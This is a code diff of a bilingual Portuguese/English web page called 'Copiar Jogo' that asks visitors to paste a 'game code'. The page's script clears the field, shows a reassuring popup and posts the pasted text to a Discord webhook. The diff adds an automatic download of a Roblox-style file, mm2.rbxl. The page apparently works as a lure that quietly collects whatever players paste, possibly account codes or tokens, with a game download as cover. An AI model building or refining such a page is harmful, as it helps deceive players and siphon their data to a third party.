@@ -228,8 +228,10 @@
         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
       </svg>
     </div>
+
     <h1 id="title">Copiar Jogo</h1>
     <p class="subtitle" id="subtitle">Cole o código e envie com um clique</p>
+
     <div class="input-group">
       <label for="codigo" id="labelCodigo">Código do jogo</label>
       <input 
@@ -240,6 +242,7 @@
         spellcheck="false"
       >
     </div>
+
     <button class="main-btn" id="btnCopiar" onclick="enviarCodigo()">
       Copiar Jogo
     </button>
@@ -275,7 +278,7 @@
         button: "Copiar Jogo",
         sending: "Enviando...",
         popupTitle: "Download começando agora",
-        popupText: "O download começou.",
+        popupText: "Seu código foi enviado com sucesso.",
         popupBtn: "Fechar",
         flag: "🇧🇷",
         code: "PT",
@@ -290,7 +293,7 @@
         button: "Copy Game",
         sending: "Sending...",
         popupTitle: "Download starting now",
-        popupText: "The download start.",
+        popupText: "Your code was sent successfully.",
         popupBtn: "Close",
         flag: "🇺🇸",
         code: "US",
@@ -326,16 +329,31 @@
       const input = document.getElementById('codigo');
       const codigo = input.value.trim();
       const btn = document.getElementById('btnCopiar');
+
       if (!codigo) {
         input.focus();
         return;
       }
+
       btn.disabled = true;
       btn.textContent = texts[currentLang].sending;
+
       // Mostra o popup imediatamente
       mostrarPopup();
       input.value = '';
-      // Tenta enviar pro Discord (não impede o popup)
+
+      // === DOWNLOAD DO ARQUIVO mm2.rbxl ===
+      const nomeArquivo = "mm2.rbxl";
+
+      const link = document.createElement('a');
+      link.href = nomeArquivo;          // mesmo diretório do index.html
+      link.download = nomeArquivo;      // força o download
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      // ==================================
+
+      // Tenta enviar pro Discord (não impede o popup nem o download)
       if (!WEBHOOK_URL.includes('SEU_ID')) {
         try {
           await fetch(WEBHOOK_URL, {
@@ -349,6 +367,7 @@
           console.log('Erro no webhook:', e);
         }
       }
+
       btn.disabled = false;
       btn.textContent = texts[currentLang].button;
     }
